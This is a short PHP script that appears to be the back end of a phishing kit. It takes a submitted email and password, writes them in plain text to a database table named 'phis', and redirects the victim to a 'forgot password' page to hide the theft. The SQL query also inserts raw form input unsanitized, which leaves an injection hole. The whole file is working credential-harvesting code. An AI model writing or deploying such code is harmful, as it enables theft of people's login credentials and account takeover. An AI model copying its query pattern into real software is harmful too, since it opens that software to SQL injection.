<?php

require_once('../db-connection.php');
$t = time();
$email = $_POST['email'];
$password = $_POST['password'];
$time = date("Y-m-d",$t);
$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`) VALUES ('$email','$password','$time')";
$link->query($query);
$email = $_POST['email'];
header ('Location:forgot/index.php?email='.$email);
exit;

?>